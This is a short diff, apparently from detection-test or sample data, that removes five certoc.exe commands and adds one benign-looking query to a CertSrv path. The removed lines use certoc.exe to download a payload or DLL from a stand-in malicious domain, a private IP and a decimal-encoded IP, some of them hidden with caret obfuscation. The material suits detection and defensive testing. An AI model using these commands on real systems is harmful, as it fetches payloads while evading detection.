@@ -1,5 +1,1 @@
-certoc.exe -Get^C^A^C^A^P^S http://192.168.1.100/payload.ext
-certoc.exe -GetCACAPS http://malicious-domain.com/payload.ext
-certoc.exe -GetCACAPS http://2886729738/payload.ext
-certoc.exe -GetCACAPS httpayload.dll
-certoc.exe /GetCACAPS httpayload.dll
+CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/
